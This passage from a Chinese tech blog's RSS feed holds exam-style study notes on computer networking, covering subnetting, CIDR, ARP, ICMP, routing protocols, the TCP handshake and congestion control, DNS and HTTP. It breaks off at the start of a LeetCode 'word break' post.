    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;某网络的P地址空间为192.168.5.0/24，采用长子网划分，子网掩码为255.255.255.248，则该网络的最大子网个数为32，每个子网内的最大可分配地址个数为6&lt;br&gt;
解析：先将子网掩码写成二进制为11111111 11111111 11111111 11111000，可见IP地址空间192.168.5.0/24(本来主机位是8位）拿出了5位来划分子网，所以一共可以划分32个子网(这里使用的是 CIDR,所以全“0”、全“1”的子网不用去除);而主机位只有3位了，所以最大可分配的地址是23-2=6个(要去除全“0”、全“1”的地址)。&lt;/p&gt;&lt;/div&gt;

&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;子网掩码&lt;br&gt;
子网掩码是一个与P地址相对应的32位的二进制串，它由一串1和0组成。其中，1对应于P地址中的网络号和子网号，0对应于主机号。因为1对1进行与操作，结果为1;1对0进行与操作，结果为0&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;cidr&#34;&gt;CIDR&lt;/h4&gt;
&lt;p&gt;无分类编址（CIDR）是为解决IP地址耗尽而提出的一种措施&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CIDR消除了传统的A类、B类和C类地址以及划分子网的概念，因而可以更加有效地分配IPv4的地址空间。CIDR使用各种长度的“网络前缀”来代替分类地址中的网络号和子网号。于是，IP地址又从三级编址回到了两级编址，其地址格式为   IP地址::-{&amp;lt;网络前缀&amp;gt;，&amp;lt;主机号&amp;gt;}&lt;br&gt;
为了区分网络前缀，通常采用“斜线记法”(又称CIDR记法)，即IP地址/网络前缀所占位数&lt;/li&gt;
&lt;li&gt;将网络前缀都相同的连续的IP地址组成“CIDR地址块”。一个CIDR地址块可以表示很多地址，这种地址的聚合常称为路由聚合(也称构成超网)，它使得路由表中的一个项目可以表示很多个原来传统分类地址的路由，因此可以缩短路由表，减小路由器之间选择信息的交换，从而提高网络性能&lt;/li&gt;
&lt;/ol&gt;



&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;最长前缀匹配原则:在使用CIDR时，路由表中的每个项目由网络前缀和下一跳地址组成，这样就会导致查找路由表时可能会得到不止一个匹配结果。应当从匹配结果中选择具有最长网络前缀的路由，因为网络前缀越长，其地址块就越小，路由就越具体&lt;/p&gt;&lt;/div&gt;

&lt;h4 id=&#34;arp&#34;&gt;ARP&lt;/h4&gt;
&lt;p&gt;在每个主机中都有一个ARP高速缓存，里面存放的是所在局域网上的各主机和路由器的IP地址到硬件地址的映射表，ARP的职责就是动态地维护该表。&lt;/p&gt;
&lt;p&gt;当源主机欲向本局域网上的某个目标主机发送IP分组时，应先在其ARP高速缓存中查看有无目标主机的IP地址。如果有，就可查出其对应的硬件地址，再将此硬件地址写入MAC帧，然后通过局域网将该MAC帧发往此硬件地址。如果没有，则先通过广播ARP请求分组，在获得目标主机的ARP响应分组后，将目标主机的硬件地址写入ARP 高速缓存，建立目标主机的P地址到硬件地址的映射关系。&lt;/p&gt;
&lt;p&gt;ARP是解决同一个局域网上的主机或路由器的IP地址和硬件地址的映射问题的。如果所要找的主机和源主机不在同一个局域网上，那么就要通过ARP找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络，剩下的工作就由下一个网络来做。&lt;/p&gt;
&lt;p&gt;ARP请求分组是广播送的，ARP响应分组是普通的单播，即从一个源地址发送到一个目的地址&lt;/p&gt;
&lt;h4 id=&#34;dhcp&#34;&gt;DHCP&lt;/h4&gt;
&lt;p&gt;动态主机配置协议（DHCP）常用于给主机动态地分配P地址&lt;/p&gt;
&lt;p&gt;DHCP是应用层协议，DHCP报文使用 UDP传输&lt;/p&gt;
&lt;h4 id=&#34;icmp&#34;&gt;ICMP&lt;/h4&gt;
&lt;p&gt;ICMP报文分为两种，即ICMP差错报告报文和ICMP询问报文&lt;/p&gt;
&lt;p&gt;ICMP差错报告报文的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;终点不可达。当路由器或主机不能交付数据报时，就向源点发送终点不可达报文。&lt;/li&gt;
&lt;li&gt;源站抑制。当路由器或主机由于拥塞而丢弃数据报时，就向源点发送源点抑制报文，使源点知道应当把数据报的发送速率放慢。&lt;/li&gt;
&lt;li&gt;时间超过。当IP分组的TTL值被减为0后，路由器除了要丢弃该分组外，还要向源点发送时间超过报文。当终点在预先规定的时间内不能收到一个数据报的全部数据报片时，就把已收到的数据报片都丢弃，并向源点发送时间超过报文。&lt;/li&gt;
&lt;li&gt;参数问题。当路由器或目的主机收到的数据报的首部中有字段的值不正确时，就丢弃该数据报，并向源点发送参数问题报文（现在一般都不发)。&lt;/li&gt;
&lt;li&gt;改变路由（重定向)。路由器把改变路由报文发送给主机，让主机知道下次应将数据报发送给其他的路由器（比当前更好的路由)。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ICMP询问报文的分类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;有回送请求和回答报文&lt;/li&gt;
&lt;li&gt;时间戳请求和回答报文&lt;/li&gt;
&lt;li&gt;掩码地址请求和回答报文&lt;/li&gt;
&lt;li&gt;路由器询问和通告报文&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;路由协议&#34;&gt;路由协议&lt;/h3&gt;
&lt;h4 id=&#34;路由选择协议分类&#34;&gt;路由选择协议分类&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;内部网关协议(IGP)&lt;/li&gt;
&lt;li&gt;外部网关协议(EGP)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;rip&#34;&gt;RIP&lt;/h4&gt;
&lt;p&gt;RIP认为一个好的路由就是它通过的路由器的数目少，即“距离短”。RIP 允许一条路径最多只能包含15个路由器。“距离”的最大值为16时即相当于不可达。可见，RIP只适用于小型互联网。RIP不能在两个网络之间同时使用多条路由。RIP选择一个具有最少路由器的路由（最短路由)，哪怕还存在另一条高速（低时延）但路由器较多的路由&lt;/p&gt;
&lt;p&gt;RIP的三要点:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;仅和相邻路由器交换信息&lt;/li&gt;
&lt;li&gt;交换的信息是当前本路由器所知道的全部信息，即自己的路由表&lt;/li&gt;
&lt;li&gt;按固定的时间间隔（如每隔30s）交换路由信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;ospf&#34;&gt;OSPF&lt;/h4&gt;
&lt;p&gt;OSPF协议的三要点:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法&lt;/li&gt;
&lt;li&gt;发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息&lt;/li&gt;
&lt;li&gt;“链路状态”就是说明本路由器都和哪些路由器相邻以及该链路的“度量”(metric)。只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;bgp&#34;&gt;BGP&lt;/h4&gt;
&lt;p&gt;边界网关协议（BGP）是在不同自治系统的路由器之间交换路由信息的协议&lt;br&gt;
边界网关协议只能是力求寻找一条能够到达目的网络且比较好的路由（不能转圈)，而并非要寻找一条最佳路由&lt;/p&gt;
&lt;h4 id=&#34;总结&#34;&gt;总结&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;特性&lt;/th&gt;
&lt;th&gt;RIP&lt;/th&gt;
&lt;th&gt;OSPF&lt;/th&gt;
&lt;th&gt;BGP&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;类型&lt;/td&gt;
&lt;td&gt;内部&lt;/td&gt;
&lt;td&gt;内部&lt;/td&gt;
&lt;td&gt;外部&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路由算法&lt;/td&gt;
&lt;td&gt;距离-向量&lt;/td&gt;
&lt;td&gt;链路状态&lt;/td&gt;
&lt;td&gt;路径-向量&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传递协议&lt;/td&gt;
&lt;td&gt;UDP&lt;/td&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;TCP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;路径选择&lt;/td&gt;
&lt;td&gt;跳数最少&lt;/td&gt;
&lt;td&gt;代价最低&lt;/td&gt;
&lt;td&gt;较好，非最佳&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;交换结点&lt;/td&gt;
&lt;td&gt;和本结点相邻的路由器&lt;/td&gt;
&lt;td&gt;网络中所有的路由器&lt;/td&gt;
&lt;td&gt;和本结点相邻的路由器&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;交换内容&lt;/td&gt;
&lt;td&gt;当前本路由器知道的全部信息，即自己的路由表&lt;/td&gt;
&lt;td&gt;与本路由器相邻的所有路由器的链路状态&lt;/td&gt;
&lt;td&gt;首次：整个路由表；非首次：有变化的部分&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;网络层设备&#34;&gt;网络层设备&lt;/h3&gt;
&lt;h4 id=&#34;路由器的组成与功能&#34;&gt;路由器的组成与功能&lt;/h4&gt;
&lt;p&gt;路由器工作在网络层，实质上是一种多个输入端口和多个输出端口的专用计算机，其任务是连接不同的网络转发分组&lt;/p&gt;
&lt;p&gt;路由选择：确定数据报走那一条路径，即路由器根据不同的算法生成动态的路由表&lt;/p&gt;
&lt;p&gt;分组转发：路由器根据转发表将用户的IP数据从合适的端口报转发出去&lt;/p&gt;



&lt;div class=&#34;notice notice-info&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M256 8a248 248 0 100 496 248 248 0 000-496zm0 110a42 42 0 110 84 42 42 0 010-84zm56 254c0 7-5 12-12 12h-88c-7 0-12-5-12-12v-24c0-7 5-12 12-12h12v-64h-12c-7 0-12-5-12-12v-24c0-7 5-12 12-12h64c7 0 12 5 12 12v100h12c7 0 12 5 12 12v24z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;为什么要划分子网？子网掩码的作用是什么？&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;由于因特网的每台主机都要分配一个唯一的P地址，所以分配的P地址很多，这将使路由器的路由表变得很大，进而影响了路由器在进行路由选择时的工作效率。解决这个问题的方法就是将一个大的网络划分为几个较小的网络,每个小的网络称为一个子网。&lt;/li&gt;
&lt;li&gt;当一个分组到达一个路由器时，路由器应该能够判断出P地址的网络号。子网掩码用来判断IP地址的哪一部分是网络号与子网号，哪一部分是主机号。为了完成这种分离，路由器将对IP地址和子网掩码进行“与”运算。&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;

&lt;h2 id=&#34;传输层&#34;&gt;传输层&lt;/h2&gt;
&lt;h3 id=&#34;传输层提供的服务&#34;&gt;传输层提供的服务&lt;/h3&gt;
&lt;h4 id=&#34;传输层的功能&#34;&gt;传输层的功能&lt;/h4&gt;
&lt;p&gt;传输层为两台主机提供了应用进程之间的通信，又称为端到端通信&lt;br&gt;
传输层的功能如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提供应用进程间的逻辑通信(网络层提供主机之间的逻辑通信)&lt;/li&gt;
&lt;li&gt;差错检测&lt;/li&gt;
&lt;li&gt;提供无连接或面向连接的服务&lt;/li&gt;
&lt;li&gt;复用和分用&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;协议&lt;/th&gt;
&lt;th&gt;TCP (Transmission Control Protocol)&lt;/th&gt;
&lt;th&gt;IP (Internet Protocol)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;层级&lt;/td&gt;
&lt;td&gt;传输层 (Transport Layer)&lt;/td&gt;
&lt;td&gt;网络层 (Network Layer)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;功能&lt;/td&gt;
&lt;td&gt;提供可靠的、面向连接的数据传输服务&lt;/td&gt;
&lt;td&gt;提供不可靠的、无连接的数据传输服务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据单位&lt;/td&gt;
&lt;td&gt;段 (Segment)&lt;/td&gt;
&lt;td&gt;数据报 (Datagram)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;控制机制&lt;/td&gt;
&lt;td&gt;流量控制、拥塞控制、错误检测和纠正&lt;/td&gt;
&lt;td&gt;无（由上层协议处理错误和控制）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;地址类型&lt;/td&gt;
&lt;td&gt;端口号 (Port Number)&lt;/td&gt;
&lt;td&gt;IP地址 (IP Address)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;适用场景&lt;/td&gt;
&lt;td&gt;需要可靠传输的应用，如网页浏览、文件传输&lt;/td&gt;
&lt;td&gt;所有通过网络层发送的数据&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;传输层寻址与端口&#34;&gt;传输层寻址与端口&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;端口的基本概念&lt;br&gt;
端口就是用来标识应用层的进程&lt;br&gt;
软件端口与硬件端口的区别:硬件端口是不同硬件设备进行交互的接口(如交换机和路由器的端口),而软件端口是应用层的各种协议进程与传输实体进行层间交互的一种地址&lt;/li&gt;
&lt;li&gt;端口号&lt;br&gt;
由于同一时刻一台主机上会有大量的网络应用进程在运行，所以需要有大量的端口号来标识不同的进程&lt;/li&gt;
&lt;li&gt;套接字&lt;br&gt;
套接字 = (主机IP地址，端口号)&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;无连接服务与面向连接服务&#34;&gt;无连接服务与面向连接服务&lt;/h4&gt;
&lt;p&gt;传输层提供了两种类型的服务:无连接服务和面向连接服务，相应的实现分别是用户数据报协议（UDP）和传输控制协议（TCP)。当采用TCP时，传输层向上提供的是一条全双工的可靠的逻辑信道;当采用UDP时，传输层向上提供的是一条不可靠的逻辑信道。&lt;/p&gt;
&lt;p&gt;UDP的主要特点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;传送数据前无须建立连接，数据到达后也无须确认&lt;/li&gt;
&lt;li&gt;不可靠交付&lt;/li&gt;
&lt;li&gt;报文头部短，传输开销小，时延较短&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;TCP的主要特点&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;面向连接，不提供广播或多播服务&lt;/li&gt;
&lt;li&gt;可靠交付&lt;/li&gt;
&lt;li&gt;报文段头部长，传输开销大&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;tcp&#34;&gt;TCP&lt;/h3&gt;
&lt;h4 id=&#34;tcp连接管理&#34;&gt;TCP连接管理&lt;/h4&gt;
&lt;p&gt;TCP传输连接的建立采用“三次握手”的方法&lt;/p&gt;
&lt;p&gt;第一步:客户机A的TCP向服务器B发出连接请求报文段，其首部中的同步位SYN=1(TCP 规定，SYN报文段不能携带数据，但要消耗一个序号)，并选择序号 seq=x，表明传送数据时的第一个数据字节的序号是x。&lt;/p&gt;
&lt;p&gt;第二步:服务器收到了数据报，并从SYN位为1知道这是一个建立连接的请求。如果同意，则发回确认。B在确认报文段中应使SYN=1，ACK=1，其确认号ack=x+1，自己选择的序号seq=y。注意，此时该报文段也不能携带数据(助记:因为有SYN=1，所以不能带数据)。&lt;/p&gt;
&lt;p&gt;第三步:A收到此报文段后向B给出确认，其ACK=1，确认号ack=y+1。A的TCP通知上层应用进程，连接已经建立。B的TCP收到主机A的确认后，也通知其上层应用进程，此时TCP连接已经建立，ACK报文可以携带数据（没有SYN 字段)，如果不携带数据则不消耗序号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/tcp3.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;
&lt;p&gt;释放传输连接&lt;br&gt;
第一步:数据传输结束后，通信双方都可释放连接。现在A的应用进程先向其TCP发出连接释放报文段，并停止再发送数据，主动关闭TCP连接。A将连接释放报文段首部的FIN置1，其序号 seq=u，等待B的确认。这里要注意，因为TCP是双工的，也就是说，可以想象一对TCP连接上有两条数据通路。当发送FIN报文时，发送FIN的一端就不能发送数据，也就是关闭了其中一条数据通路，但是对方还是可以发送数据的。&lt;/p&gt;
&lt;p&gt;第二步:如图5-9所示，B发出确认，确认号ack=u+1，而这个报文段自己的序号seq=v。TCP服务器进程通知高层应用进程。从A到B这个方向的连接就释放了，TCP连接处于半关闭状态。B若发送数据，则A仍要接收。&lt;/p&gt;
&lt;p&gt;第三步:若B已经没有要向A发送的数据，其应用进程就通知TCP释放连接。&lt;/p&gt;
&lt;p&gt;第四步:A收到连接释放报文段后，必须发出确认。在确认报文段中，ACK=1，确认号ack=w+1，自己的序号seq=u+1。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/tcp4.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;



&lt;div class=&#34;notice notice-warning&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 576 512&#34;&gt;&lt;path d=&#34;M570 440c18 32-5 72-42 72H48c-37 0-60-40-42-72L246 24c19-32 65-32 84 0l240 416zm-282-86a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;建立连接&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;SYN=1, seq=x&lt;/li&gt;
&lt;li&gt;SYN=1,ACK=1,seq=y,ack=x+1&lt;/li&gt;
&lt;li&gt;ACK=1,seq=x+1,ack=y+1&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;释放连接&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;FIN=1,seq=u&lt;/li&gt;
&lt;li&gt;ACK=1,seq=v,ack=u+1&lt;/li&gt;
&lt;li&gt;FIN=1,ACK=1,seq=w,ack=u+1&lt;/li&gt;
&lt;li&gt;ACK=1,seq=u+1,ack=w+1&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

&lt;h4 id=&#34;tcp可靠传输&#34;&gt;TCP可靠传输&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;TCP数据编号与确认&lt;br&gt;
TCP是面向字节的。TCP将所要传送的报文看成是字节组成的数据流，并使每一个字节对应于一个序号。在连接建立时，双方要商定初始序号。TCP每次发送的报文段的首部中的序号字段数值表示该报文段中的数据部分的第一个字节的序号。&lt;br&gt;
TCP 的确认是对接收到的数据的最高序号表示确认。接收端返回的确认号是已收到的数据的最高序号加1。因此，确认号表示接收端期望下次收到的数据中的第一个数据字节的序号。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;TCP的重传机制
TCP每发送一个报文段，就对这个报文段设置一次计时器。只要计时器设置的重传时间到了规定时间还没有收到确认，那么就要重传该报文段。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;RTT=(1-α)×(旧的 RTT)+α×(新的往返时延样本)&lt;/p&gt;
&lt;h4 id=&#34;tcp拥塞控制的基本概念&#34;&gt;TCP拥塞控制的基本概念&lt;/h4&gt;
&lt;p&gt;拥塞控制与流量控制的性质对比:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;拥塞控制所要做的只有一个目的，就是使得网络能够承受现有的网络负荷。&lt;/li&gt;
&lt;li&gt;拥塞控制是一个全局性的过程，涉及所有的主机、所有的路由器以及与降低网络传输性能有关的所有因素。&lt;/li&gt;
&lt;li&gt;流量控制往往指在给定的发送端和接收端之间的点对点通信量的控制。&lt;/li&gt;
&lt;li&gt;流量控制所要做的就是抑制发送端发送数据的速率，以便使接收端来得及接收。&lt;/li&gt;
&lt;li&gt;拥塞控制是很难设计的，因为它是一个动态的（而不是静态的）问题。&lt;/li&gt;
&lt;li&gt;当前网络正朝着高速化的方向发展，这很容易出现缓存不够大而造成分组的丢失。但分组的丢失是网络发生拥塞的征兆而不是原因。&lt;/li&gt;
&lt;li&gt;在许多情况下，正是拥塞控制本身成为引起网络性能恶化甚至发生死锁的原因，这点应特别引起重视。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;拥塞控制又分为闭环控制和开环控制&lt;/p&gt;
&lt;h4 id=&#34;拥塞控制的4种算法&#34;&gt;拥塞控制的4种算法&lt;/h4&gt;
&lt;p&gt;发送端的主机在确定发送报文段的速率时，既要根据接收端的接收能力，又要从全局考虑不要使网络发生拥塞。因此，TCP要求发送端维护以下两个窗口。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;接收端窗口rwnd:接收端根据其目前接收缓存大小所许诺的最新的窗口值，反映了接收端的容量。由接收端将其放在TCP报文的首部的窗口字段通知发送端，如图5-14所示。&lt;/li&gt;
&lt;li&gt;拥塞窗口cwnd:发送端根据自己估计的网络拥塞程度而设置的窗口值，反映了网络的当前容量。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;发送端发送窗口的上限值应当取接收端窗口rwnd和拥塞窗口cwnd这两个变量中较小的一个，即应按以下公式确定:&lt;br&gt;
发送窗口的上限值=Min [rwnd，cwnd]&lt;/p&gt;
&lt;p&gt;慢开始算法的原理&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在主机刚刚开始发送报文段时可先设置拥塞窗口 cwnd=1，即设置为一个最大报文段长度MSS的数值&lt;/li&gt;
&lt;li&gt;在每收到一个对新的报文段的确认后，将拥塞窗口加1，即增加一个MSS的数值&lt;/li&gt;
&lt;li&gt;用这样的方法逐步增大发送端的拥塞窗口 cwnd，可以使分组注入到网络的速率更加合理&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;拥塞避免算法的原理&lt;br&gt;
为防止拥塞窗口 cwnd的增长引起网络阻塞，还需要一个状态变量，即慢开始门限ssthresh，其用法如下:&lt;br&gt;
当cwnd&amp;lt;ssthresh时，使用慢开始算法&lt;br&gt;
当cwnd&amp;gt;ssthresh时，停止使用慢开始算法，改用拥塞避免算法&lt;br&gt;
当cwnd=ssthresh 时，既可以使用慢开始算法，也可以使用拥塞避免算法&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/yongse.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;
&lt;p&gt;快重传算法&lt;/p&gt;
&lt;p&gt;快恢复算法
&lt;img src=&#34;https://xuoneyuan.github.io/images/chongchuan.png&#34; alt=&#34;tcp&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;应用层&#34;&gt;应用层&lt;/h2&gt;
&lt;h3 id=&#34;网络应用模型&#34;&gt;网络应用模型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;客户/服务器模型(C/S模型)&lt;/li&gt;
&lt;li&gt;P2P模型&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;dns系统&#34;&gt;DNS系统&lt;/h3&gt;
&lt;h4 id=&#34;dns系统的概念&#34;&gt;DNS系统的概念&lt;/h4&gt;
&lt;p&gt;从概念上可以将DNS分为3个部分:层次域名空间、域名服务器、解析器&lt;/p&gt;
&lt;h4 id=&#34;层次域名空间&#34;&gt;层次域名空间&lt;/h4&gt;
&lt;p&gt;级别最低的域名写在最左边，而级别最高的顶级域名写在最右边&lt;/p&gt;
&lt;h4 id=&#34;域名服务器&#34;&gt;域名服务器&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;根域名服务器&lt;/li&gt;
&lt;li&gt;顶级域名服务器&lt;/li&gt;
&lt;li&gt;权限域名服务器&lt;/li&gt;
&lt;li&gt;本地域名服务器&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;ftp&#34;&gt;FTP&lt;/h3&gt;
&lt;p&gt;FTP客户机和服务器间传递 FTP命令时，使用的连接是建立在TCP之上的控制连接&lt;/p&gt;
&lt;h3 id=&#34;www&#34;&gt;WWW&lt;/h3&gt;
&lt;h4 id=&#34;www的概念和组成结构&#34;&gt;WWW的概念和组成结构&lt;/h4&gt;
&lt;p&gt;一个大规模的、联机式的信息储藏所&lt;br&gt;
wwW使用统一资源定位符（URL）来标志wwW上的各种文档。URL 的一般格式为&lt;br&gt;
&amp;lt;协议&amp;gt;://&amp;lt;主机&amp;gt;:&amp;lt;端口号&amp;gt;/&amp;lt;路径&amp;gt;&lt;/p&gt;
&lt;h4 id=&#34;http&#34;&gt;HTTP&lt;/h4&gt;
&lt;p&gt;超文本传送协议（HTTP）是在客户程序（如浏览器）与www服务器程序之间进行交互所使用的协议。HTTP是面向事务的应用层协议，它使用TCP连接进行可靠传输，服务器默认监听在80端口。&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">计算机基础知识</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/">计算机</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/408/">408</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>单词拆分</title>
                <link>https://xuoneyuan.github.io/posts/9/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/9/</guid>
                <pubDate>Wed, 06 Dec 2023 14:29:49 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;今天继续手撕算法，这两天新做的，也属于是面试高频题了，特别是单词拆分II，周赛的味儿太重了，动不动就超时&lt;/p&gt;
&lt;h3 id=&#34;单词拆分i&#34;&gt;单词拆分I&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://leetcode.cn/problems/word-break/description/&#34;&gt;题目链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/wordbreak1.png&#34; alt=&#34;wordbreak1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;看到这题自然而然想到遍历，先用常规的暴力解法DFS和BFS来试一试，不出意外结果超时了emm&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
